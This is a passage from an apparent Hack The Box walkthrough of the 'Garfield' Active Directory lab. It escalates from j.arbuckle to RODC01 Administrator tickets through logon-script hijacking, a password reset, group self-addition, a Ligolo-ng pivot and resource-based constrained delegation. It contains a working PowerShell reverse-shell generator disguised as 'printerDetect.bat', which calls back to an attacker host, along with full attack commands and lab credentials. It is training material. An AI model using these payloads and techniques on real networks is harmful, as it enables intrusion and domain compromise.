mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
url: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
scriptPath: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
wWWHomePage: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
scriptPath: WRITE

distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD

distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
dnsNode: CREATE_CHILD
dnsZoneScopeContainer: CREATE_CHILD
```

The output contains numerous writable attributes across several Active Directory objects. However, most of these permissions are low-impact and relate to standard user profile fields such as phone numbers, addresses, certificates, and other informational attributes.

Rather than focusing on every writable property, attention should be directed toward the permissions that could realistically contribute to privilege escalation.

### Interesting Finding #1: Writable `scriptPath` Attributes

The enumeration reveals that the current user can modify the **scriptPath** attribute of several domain accounts:

```
CN=krbtgt_8245
    scriptPath: WRITE

CN=Liz Wilson
    scriptPath: WRITE

CN=Liz Wilson ADM
    scriptPath: WRITE
```

The **scriptPath** attribute specifies a logon script that is executed when a user authenticates to the domain. The ability to modify this attribute is unusual and immediately warrants further investigation.

Of particular interest are:

```
Liz Wilson
Liz Wilson ADM
```

These accounts were previously identified during LDAP and BloodHound enumeration, with **l.wilson\_adm** already established as a privileged account within the RODC administration hierarchy.

The fact that **j.arbuckle** can directly modify an attribute belonging to these users suggests a potentially exploitable delegated permission.

### Interesting Finding #2: DNS Object Creation Rights

Additional permissions were identified within the DNS infrastructure:

```
DC=garfield.htb,CN=MicrosoftDNS,...
    dnsNode: CREATE_CHILD

DC=_msdcs.garfield.htb,CN=MicrosoftDNS,...
    dnsNode: CREATE_CHILD
```

These permissions indicate that the current user can create new DNS records within the domain-integrated DNS zones.

While this does not immediately provide privilege escalation, DNS write permissions can occasionally be abused for techniques such as:

* DNS record poisoning
* Name resolution attacks
* Coercion-based attacks
* AD-integrated DNS abuse

As a result, these permissions should be noted for later investigation if more direct attack paths fail.

The most significant discovery from this enumeration is the ability to modify the **scriptPath** attribute of both **l.wilson** and **l.wilson\_adm**.

```
j.arbuckle
    └── WRITE scriptPath
            ├── l.wilson
            └── l.wilson_adm
```

Given that **l.wilson\_adm** was previously identified as a key node in the BloodHound privilege escalation chain, any delegated permission affecting this account deserves immediate attention.

At this stage, the writable **scriptPath** attribute represents the most promising lead uncovered thus far and becomes the primary focus of subsequent enumeration efforts.

After identifying writable **scriptPath** permissions on both **l.wilson** and **l.wilson\_adm**, the next step was to determine whether either account already had a logon script configured.

The `scriptPath` attribute was queried directly using **bloodyAD**.

Checking `l.wilson` :

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" --attr scriptPath

distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
```

Checking `l.wilson_adm:`

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get object "CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb" --attr scriptPath

distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
```

In both cases, the query returned only the object's Distinguished Name (DN) and did not display a value for the `scriptPath` attribute.

This indicates that neither account currently has a logon script configured.

According to Microsoft's Active Directory implementation, the **scriptPath** attribute is optional and may be left empty. When populated, it specifies the name or relative path of a logon script that will be executed when the user authenticates to the domain. These scripts are typically stored within the **NETLOGON** share, which maps to:

```
\\<domain>\NETLOGON
```

On a domain controller, this corresponds to:

```
C:\Windows\SYSVOL\sysvol\<domain>\scripts
```

### Why This Matters?

This verification step is important because it confirms that the writable `scriptPath` permissions discovered earlier are not simply allowing modification of an existing script configuration.

Instead, **j.arbuckle** appears capable of assigning a completely new logon script to both:

```
l.wilson
l.wilson_adm
```

From an attacker's perspective, this is a much more interesting finding. If a script can be placed within a location accessible through **NETLOGON**, the `scriptPath` attribute could potentially be configured to reference that script. The script would then execute the next time the target user performs an interactive domain logon.
{% endhint %}

Since the previous enumeration revealed that **j.arbuckle** could modify the `scriptPath` attribute of both **l.wilson** and **l.wilson\_adm**, the next step was to determine whether the current user could also write files to the location from which logon scripts are executed.

To verify the permissions assigned to the domain's scripts directory, the ACLs on the **SYSVOL** scripts folder were inspected using `smbcacls`.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ smbcacls //garfield.htb/SYSVOL 'garfield.htb/scripts' -U 'j.arbuckle%Th1sD4mnC4t!@1978'                                                 
REVISION:1
CONTROL:SR|PD|DI|DP
OWNER:BUILTIN\Administrators
GROUP:NT AUTHORITY\SYSTEM
ACL:CREATOR OWNER:ALLOWED/OI|CI|IO/FULL
ACL:NT AUTHORITY\Authenticated Users:ALLOWED/OI|CI/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|IO/FULL
ACL:BUILTIN\Administrators:ALLOWED/0x0/RWXPO
ACL:BUILTIN\Server Operators:ALLOWED/OI|CI/READ
ACL:GARFIELD\IT Support:ALLOWED/OI|CI/RWXD
```

Among the returned access control entries, the following permission is particularly noteworthy:

```
GARFIELD\IT Support: ALLOWED/OI|CI/RWXD
```

### Analysis

The **RWXD** permission grants members of the **IT Support** group the ability to:

| Permission | Meaning                         |
| ---------- | ------------------------------- |
| R          | Read files and directories      |
| W          | Write or modify files           |
| X          | Traverse and access directories |
| D          | Delete files and folders        |

These rights effectively provide members of the group with full control over the contents of the scripts directory, including the ability to create, modify, and remove logon scripts.

The significance of this finding becomes apparent when correlated with the permissions identified earlier:

```
j.arbuckle
    ├── WRITE scriptPath on l.wilson
    └── WRITE scriptPath on l.wilson_adm
```

Combined with write access to the scripts directory, this creates a potentially exploitable scenario:

1. Upload a custom script into the domain's scripts directory.
2. Modify the target user's `scriptPath` attribute to reference that script.
3. Wait for the target user to authenticate and execute the assigned logon script.

### Correlation with Group Membership

Further investigation revealed that **j.arbuckle** is a member of the **IT Support** group.

As a result, the permissions assigned to the group apply directly to the current user:

```
IT Support
      │
      ▼
RWXD on SYSVOL\scripts
      │
      ▼
j.arbuckle
```

This confirms that the user not only has the ability to modify the `scriptPath` attribute of the target accounts but also possesses the necessary permissions to place scripts within the location referenced by that attribute.

At this stage, the necessary conditions for logon script abuse had been confirmed:

* **j.arbuckle** could modify the `scriptPath` attribute of **l.wilson**.
* **j.arbuckle** had write access to the domain's **SYSVOL\scripts** directory through membership in the **IT Support** group.

These permissions could be combined to force the execution of an attacker-controlled logon script whenever the target user authenticated to the domain.

### Preparing the Logon Script

`payload_gen.sh` :

```bash
#/bin/bash
IP="10.10.14.52"
PORT="1234"
OUTPUT="printerDetect.bat"

PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("'$IP'",'$PORT');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
B64=$(echo -n "$PAYLOAD" | iconv -t UTF-16LE | base64 -w 0)

cat > "$OUTPUT" << EOF
@echo off
powershell -enc $B64
EOF

echo "[+] Done! File created: $OUTPUT"
echo "[+] Target: $IP:$PORT"
ls -l "$OUTPUT"
```

A custom batch file was generated and configured to establish a connection back to the attacker's host when executed.

After generating the payload, a new version of `printerDetect.bat` was created:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ chmod +x payload_gen.sh

┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ ./payload_gen.sh                                                                                             
[+] Done! File created: printerDetect.bat
[+] Target: 10.10.14.52:1234
-rw-r--r-- 1 kuroshiro kuroshiro 1363 Jul 17 07:17 printerDetect.bats
```

The script successfully generated a modified `printerDetect.bat` file that would later be referenced through the target user's `scriptPath` attribute.

Since the current user possessed write access to the domain scripts directory, the modified script was uploaded to the **SYSVOL** share:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ smbclient //10.129.7.99/SYSVOL -U "garfield.htb/j.arbuckle" -c 'cd garfield.htb\scripts; put printerDetect.bat printerDetect.bat'
Password for [GARFIELD.HTB\j.arbuckle]:
putting file printerDetect.bat as \garfield.htb\scripts\printerDetect.bat (6.1 kb/s) (average 6.1 kb/s)
```

The upload completed successfully, confirming that **j.arbuckle** could place arbitrary scripts within the location used by domain logon scripts.

### Assigning the Script to the Target User

With the script now accessible through the domain's scripts directory, the next step was to configure **l.wilson** to execute it during logon.

The writable `scriptPath` attribute identified earlier was updated accordingly:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u j.arbuckle -p 'Th1sD4mnC4t!@1978' set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" scriptPath -v printerDetect.bat
[+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
```

This confirmed that the logon script assigned to **l.wilson** had been replaced with an attacker-controlled script located within the domain's scripts directory.

### Obtaining Code Execution

After waiting for the target user to authenticate, an incoming connection was received from the target system.

Verification of the current security context revealed:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.52] from (UNKNOWN) [10.129.7.99] 63353

PS C:\Windows\system32> whoami
garfield\l.wilson
```

This successfully validated the attack path identified during enumeration:

```
j.arbuckle
      │
      ├── Write access to SYSVOL\scripts
      │
      └── Write scriptPath on l.wilson
                    │
                    ▼
            Logon Script Execution
                    │
                    ▼
                l.wilson
```

What initially appeared to be two low-impact permissions ultimately combined into a viable privilege escalation vector. By controlling both the location where logon scripts were stored and the attribute that specifies which script a user executes during authentication, it was possible to obtain code execution in the context of **l.wilson** without requiring knowledge of the user's password.

### Assessment

This finding demonstrates the risk of delegated permissions within Active Directory environments. Individually, write access to a script directory or the ability to modify a user's `scriptPath` attribute may appear harmless. However, when combined, they allow an attacker to hijack the user's logon process and execute arbitrary code under their security context.

As a result, the initial foothold as **j.arbuckle** was successfully leveraged to gain access to the higher-value account **l.wilson**, bringing the attack one step closer to the privileged relationships previously identified in BloodHound.

## Escalating from `l.wilson` to `l.wilson_adm`

After obtaining access to the **l.wilson** account through the logon script abuse technique, the next objective was to leverage the privilege escalation path previously identified in BloodHound.

Earlier analysis revealed the following relationship:

```
l.wilson
        │
        ▼
ForceChangePassword
        │
        ▼
l.wilson_adm
```

This permission grants **l.wilson** the ability to reset the password of **l.wilson\_adm** without requiring knowledge of the account's existing password.

### Resetting the Password

Using the PowerShell session running as **l.wilson**, a new password was prepared and assigned to the target account.

First, a secure string containing the new password was created:

```powershell
PS C:\Windows\system32> $password = ConvertTo-SecureString 'kuroshiro123' -AsPlainText -Force
```

Next, the password reset operation was performed:

```powershell
PS C:\Windows\system32> Set-ADAccountPassword -Identity l.wilson_adm -NewPassword $password -Reset
```

The command completed successfully, indicating that **l.wilson** possessed sufficient privileges to reset the password of the administrative account.

### Verifying Access

With the password changed, authentication was attempted using the newly assigned credentials.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ evil-winrm -i garfield.htb -u 'l.wilson_adm' -p kuroshiro123                                                 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                  
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                             
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami
garfield\l.wilson_adm
```

### Analysis

This step directly confirms the attack path identified during BloodHound enumeration.

```
j.arbuckle
        │
        ▼
     l.wilson
        │
        ▼
ForceChangePassword
        │
        ▼
 l.wilson_adm
```

Rather than attempting to recover credentials or perform password attacks, the delegated **ForceChangePassword** permission provided a much cleaner route to account compromise. Since the permission allows password resets without knowledge of the existing password, control of **l.wilson** immediately translated into control of **l.wilson\_adm**.

### Assessment

This represents the first major privilege escalation within the domain. By abusing a delegated password reset permission, it was possible to transition from a standard user account to a privileged administrative account without generating the noise typically associated with password spraying, credential theft, or offline cracking attacks.

More importantly, **l.wilson\_adm** was previously identified as a critical node within the BloodHound privilege graph, possessing delegated rights over the **RODC01** computer account. As a result, obtaining access to this account unlocks the next stage of the attack path and brings us significantly closer to full domain compromise.

## Leveraging Group-Based Privileges over the RODC Infrastructure

After successfully obtaining access to **l.wilson\_adm**, attention shifted back to the privilege escalation paths previously identified in BloodHound.

Earlier analysis revealed two important relationships:

```
l.wilson_adm
        │
        ├── WriteAccountRestrictions ──► RODC01$
        │
        └── MemberOf ──► TIER 1
                               │
                               ▼
                         AddSelf
                               │
                               ▼
                    RODC Administrators
```

The **WriteAccountRestrictions** permission indicated that **l.wilson\_adm** had delegated control over certain account restriction attributes of the **RODC01** computer object. Additionally, BloodHound showed that **l.wilson\_adm** was a member of the **TIER 1** group, which possessed the **AddSelf** privilege over the **RODC Administrators** group.

This suggested a potential escalation path through group membership before attempting to abuse the permissions assigned directly to **RODC01**.

### Verifying Group Membership

To validate the BloodHound findings from the newly obtained WinRM session, the current user's privileges and group memberships were reviewed.

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

The output showed only a limited set of local privileges, none of which immediately explained the delegated rights identified in BloodHound.

The user's group memberships were then examined:

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                           Attributes
=========================================== ================ ============================================= ==================================================
Everyone                                    Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
GARFIELD\Tier 1                             Group            S-1-5-21-2502726253-3859040611-225969357-3108 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Among the listed groups, the following entry confirmed the earlier BloodHound observation:

```
GARFIELD\Tier 1
```

This verified that **l.wilson\_adm** was indeed a member of the **Tier 1** group and therefore should inherit any permissions granted to that group.

### Abusing the AddSelf Permission

Since BloodHound indicated that **Tier 1** possessed the **AddSelf** right over **RODC Administrators**, the next step was to test whether the account could add itself to that group.

Using **bloodyAD**, the membership modification was performed:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u l.wilson_adm -p 'kuroshiro123' add groupMember "RODC Administrators" l.wilson_adm
[+] l.wilson_adm added to RODC Administrators
```

### Why This Matters?

At first glance, joining **RODC Administrators** may not appear particularly impactful. However, this group is responsible for administering the Read-Only Domain Controller infrastructure.

By obtaining membership in this group, we effectively gain administrative influence over the **RODC01** computer object and its associated credential caching policies.

In particular, RODC administration provides control over attributes such as:

```
msDS-RevealOnDemandGroup
msDS-NeverRevealGroup
```

These attributes determine which accounts are allowed or forbidden from having their credentials cached on the RODC.

This is a critical capability because RODCs maintain a separate Kerberos trust model based on a dedicated **per-RODC krbtgt account**. Earlier enumeration identified this account as:

```
krbtgt_8245
```

Consequently, control over the RODC administration layer can ultimately lead to control over the RODC's Kerberos secrets.
{% endhint %}

### Emerging Attack Path

At this stage, the attack chain becomes much clearer:

```
Control RODC object
        │
        ▼
Modify credential caching policy
(msDS-RevealOnDemandGroup /
 msDS-NeverRevealGroup)
        │
        ▼
Obtain privileged credentials
cached on the RODC
        │
        ▼
Gain administrative access
to RODC01
        │
        ▼
Extract per-RODC krbtgt secret
        │
        ▼
Forge RODC Kerberos tickets
        │
        ▼
Perform Key List attack
against writable DC
```

The significance of the current step is that we have successfully entered the **RODC01 management layer**. While we do not yet control the writable domain controller, we now possess the privileges necessary to influence how the RODC handles credential caching and authentication.

### Assessment

The successful addition of **l.wilson\_adm** to **RODC Administrators** represents a major milestone in the attack chain.

```
j.arbuckle
    ▼
l.wilson
    ▼
l.wilson_adm
    ▼
Tier 1
    ▼
RODC Administrators
```

This is no longer a simple user-to-user privilege escalation. Instead, the compromise has progressed into the delegated administration model of the Active Directory environment.

From this point forward, the attack focuses on abusing control over the **RODC01** object itself. By manipulating RODC credential caching policies, it becomes possible to obtain privileged credentials, compromise the RODC host, extract the RODC-specific Kerberos secrets, and ultimately leverage those secrets to attack the writable domain controller.

## Identifying the Read-Only Domain Controller

Before abusing the delegated privileges obtained through **RODC Administrators**, it was necessary to identify the actual Read-Only Domain Controller within the environment.

From earlier BloodHound analysis, we knew that the attack path revolved around the **RODC01** computer object. However, only the primary domain controller (**DC01**) was directly reachable from the attacker's machine. Therefore, additional internal network enumeration was performed from the compromised **l.wilson\_adm** session.

A PowerShell-based TCP scan was executed against the internal subnet to identify Active Directory-related services:

```powershell
*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> $Subnet="192.168.100";$P=@(445,389,636,3268,80,443,3389);1..254|%{$ip="$Subnet.$_";$o=@();foreach($p in $P){try{$t=New-Object Net.Sockets.TcpClient;$c=$t.BeginConnect($ip,$p,$null,$null);if($c.AsyncWaitHandle.WaitOne(180,$false)){$o+=$p}}catch{}finally{$t.Close()}};if($o.Count-gt0){Write-Host "[+] $ip → $($o-join',')"; try{$h=[Net.Dns]::GetHostEntry($ip).HostName; Write-Host "    Name: $h"}catch{}}}
[+] 192.168.100.1 → 445,389,636,3268,3389
    Name: DC01.garfield.htb
[+] 192.168.100.2 → 3389
    Name: RODC01.garfield.htb
```

### Analysis

The first host, **192.168.100.1**, corresponds to the primary domain controller:

```
DC01.garfield.htb
```

The exposed services include:

| Port | Service        |
| ---- | -------------- |
| 389  | LDAP           |
| 636  | LDAPS          |
| 3268 | Global Catalog |
| 445  | SMB            |
| 3389 | RDP            |

These services are consistent with a standard writable domain controller.

The second host was identified as:

```
RODC01.garfield.htb
```

Interestingly, only RDP was exposed from the perspective of the compromised host:

```
192.168.100.2 → 3389
```

Although the service footprint is minimal, the hostname directly correlates with the **RODC01** computer object previously identified throughout the BloodHound privilege escalation chain.

### Correlation with Previous Findings

This discovery confirms the target referenced by the delegated permissions identified earlier:

```
l.wilson_adm
        │
        ├── WriteAccountRestrictions
        │
        ▼
     RODC01$
```

and

```
RODC Administrators
        │
        ▼
      RODC01
```

At this point, the abstract Active Directory object observed in BloodHound can now be mapped to a real host on the network:

```
RODC01$
        │
        ▼
192.168.100.2
        │
        ▼
RODC01.garfield.htb
```

### Preparing for Further Enumeration

To simplify subsequent interactions with the host, the discovered hostname was added to the attacker's local hosts file:

```
/etc/hosts

192.168.100.2    RODC01.garfield.htb
```

This allows tools such as LDAP clients, SMB utilities, Kerberos tooling, and BloodHound-related scripts to resolve the hostname correctly without relying on external DNS resolution.

### Assessment

This enumeration step successfully identified the physical host associated with the **RODC01** computer account that has been central to the privilege escalation path thus far.

The significance of this discovery is that the attack is now transitioning from **Active Directory object abuse** to **host-focused RODC abuse**. With access to the RODC administration layer already established, the next phase will focus on leveraging those privileges against **RODC01.garfield.htb**, ultimately targeting its credential caching mechanisms and the associated **krbtgt\_8245** account that underpins the remainder of the escalation chain.

## Establishing Network Access to the Internal RODC Segment

Although **RODC01.garfield.htb** had been identified during internal network enumeration, it was not directly reachable from the attacker's machine.

Because the host resided on an internal subnet accessible only from the compromised domain controller, a pivot was required before interacting with the RODC directly.

To achieve this, **Ligolo-ng** was deployed to create a tunnel between the attacker's system and the internal network.

### Starting the Ligolo Proxy

The first step was to start the Ligolo proxy on the attacker's machine:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ sudo ligolo-proxy -selfcert
INFO[0000] Loading configuration file ligolo-ng.yaml    
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: dev

ligolo-ng » 
```

The proxy successfully initialized and began listening for incoming agent connections on port **11601**.

### Creating the Tunnel Interface

A dedicated tunnel interface was then created and enabled locally:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ sudo ip tuntap add user root mode tun ligolo 

┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ sudo ip link set ligolo up 
```

This interface would later serve as the routing point for traffic destined for the internal network.

### Deploying the Ligolo Agent

With the proxy running, the Ligolo agent was uploaded to the compromised host.

```powershell
*Evil-WinRM* PS C:\Temp> upload agent.exe
                                        
Info: Uploading /home/kuroshiro/HTB/GArfield/agent.exe to C:\Temp\agent.exe
                                        
Data: 14627496 bytes of 14627496 bytes copied
                                        
Info: Upload successful!
```

After the transfer completed successfully, the agent was executed and instructed to connect back to the attacker's proxy:

```powershell
*Evil-WinRM* PS C:\Temp> Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.14.52:11601 -ignore-cert" -WindowStyle Hidden
```

### Establishing the Tunnel

Shortly afterward, the proxy received a new connection and the newly connected session was selected and activated:

```shellscript
ligolo-ng » INFO[0299] Agent joined.                                 id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01" remote="10.129.7.99:58784"
ligolo-ng » 
ligolo-ng » session
? Specify a session : 1 - GARFIELD\l.wilson_adm@DC01 - 10.129.7.99:58784 - 00155d0bdd00
[Agent : GARFIELD\l.wilson_adm@DC01] » 
[Agent : GARFIELD\l.wilson_adm@DC01] » start
INFO[0324] Starting tunnel to GARFIELD\l.wilson_adm@DC01 (00155d0bdd00)
```

Once the session was started, Ligolo began forwarding traffic through the compromised host.

### Routing the Internal Network

To ensure that traffic destined for the internal subnet traversed the tunnel, a route was added locally:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ sudo ip route add 192.168.100.0/24 dev ligolo
```

This configuration instructed the attacker's machine to send all traffic targeting the **192.168.100.0/24** network through the Ligolo tunnel.

### Verifying Connectivity

Connectivity to the previously discovered RODC host was then tested:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ ping 192.168.100.2                                                                                                                      
PING 192.168.100.2 (192.168.100.2) 56(84) bytes of data.
64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=353 ms
64 bytes from 192.168.100.2: icmp_seq=2 ttl=64 time=119 ms
64 bytes from 192.168.100.2: icmp_seq=3 ttl=64 time=119 ms
64 bytes from 192.168.100.2: icmp_seq=4 ttl=64 time=88.4 ms
64 bytes from 192.168.100.2: icmp_seq=5 ttl=64 time=95.3 ms
```

The successful ICMP responses confirm that traffic is now being routed through the compromised **DC01** host into the previously inaccessible internal network.

The resulting pivot path can be represented as:

```
Attacker
     │
     ▼
Ligolo Proxy
     │
     ▼
DC01 (Compromised)
     │
     ▼
192.168.100.0/24
     │
     ▼
RODC01 (192.168.100.2)
```

Prior to establishing the tunnel, the attacker could only interact with systems exposed through the Hack The Box VPN network. After pivoting, hosts located behind the domain controller become directly accessible as if they were part of the local network.

### Why This Step Is Important?

Up to this point, the attack chain had focused primarily on Active Directory permissions and delegated administrative rights. However, many of the remaining techniques require direct communication with the target RODC host.

Without a pivot, the attacker would be unable to:

* Communicate directly with **RODC01**
* Perform host-level enumeration
* Access services bound only to the internal network
* Leverage the delegated RODC administration privileges discovered earlier

Establishing the tunnel therefore bridges the gap between **Active Directory privilege escalation** and **host-level RODC abuse**.
{% endhint %}

### Assessment

The Ligolo tunnel successfully extended the attacker's reach into the internal **192.168.100.0/24** network and provided direct connectivity to **RODC01.garfield.htb**.

```
j.arbuckle
    ▼
l.wilson
    ▼
l.wilson_adm
    ▼
RODC Administrators
    ▼
Pivot through DC01
    ▼
RODC01 (192.168.100.2)
```

At this stage, all prerequisites have been satisfied:

* Control of **l.wilson\_adm**
* Membership in **RODC Administrators**
* Reachability to **RODC01**
* Visibility into the internal subnet

The attack can now transition into direct abuse of the Read-Only Domain Controller and its associated credential caching infrastructure.

## Abusing Resource-Based Constrained Delegation (RBCD) to Compromise RODC01

With membership in **RODC Administrators** established and network access to the internal RODC segment available through the Ligolo tunnel, the next objective was to convert the delegated control over **RODC01** into code execution on the host itself.

Earlier enumeration revealed that **l.wilson\_adm** possessed sufficient privileges to modify sensitive attributes on the **RODC01** computer object. One of the most valuable targets for abuse is the **msDS-AllowedToActOnBehalfOfOtherIdentity** attribute, which is used by Resource-Based Constrained Delegation (RBCD).

By abusing RBCD, it becomes possible to configure a controlled machine account to impersonate other users when accessing services hosted on **RODC01**.

### Creating a Controlled Machine Account

The first step was to create a new computer account within the domain.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'l.wilson_adm' -p 'kuroshiro123' add computer 'KUROPC' 'kuroshiro123'            
[+] KUROPC$ created
```

This was possible because the account possessed the **SeMachineAccountPrivilege** right, which allows authenticated users or delegated administrators to create machine accounts within the domain.

### Configuring Resource-Based Constrained Delegation

With a controlled machine account available, RBCD was configured against the target computer object:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ bloodyad --host DC01.garfield.htb -u 'l.wilson_adm' -p 'kuroshiro123' add rbcd 'RODC01$' 'KUROPC$'
[!] No security descriptor has been returned, a new one will be created
[+] KUROPC$ can now impersonate users on RODC01$ via S4U2Proxy
[+] e.g. badS4U2proxy 'kerberos+pw://None\l.wilson_adm:kuroshiro123@DC01.garfield.htb/?serverip=10.129.7.99' 'HOST/RODC01$@None' 'Administrator@None'
```

### Analysis

This effectively establishes the following trust relationship:

```
KUROPC$
      │
      ▼
AllowedToActOnBehalfOfOtherIdentity
      │
      ▼
RODC01$
```

As a result, the attacker-controlled machine account can request Kerberos service tickets on behalf of other users when accessing services hosted on **RODC01**.

This transforms delegated object control into a direct authentication primitive against the target host.

### Requesting an Impersonation Ticket

Before interacting with Kerberos, system time was synchronized with the domain controller to avoid ticket validation issues:

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ sudo ntpdate -u DC01.garfield.htb                                                                                     
2026-07-17 15:59:00.019627 (+0000) +28794.418012 +/- 0.043204 DC01.garfield.htb 10.129.7.99 s1 no-leap
CLOCK: time stepped by 28794.418012
```

Next, a service ticket was requested for the **Administrator** account using the newly established RBCD relationship.

```shellscript
┌──(kuroshiro㉿a1sberg)-[~/HTB/GArfield]
└─$ impacket-getST GARFIELD.HTB/'KUROPC$':'kuroshiro123' -spn cifs/RODC01.garfield.htb -impersonate Administrator -dc-ip 10.129.7.99
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
```

### Analysis

This confirms that Kerberos accepted the delegation configuration and issued a service ticket representing the **Administrator** user for the target service.

The resulting flow can be summarized as:

```
KUROPC$
      │
      ▼
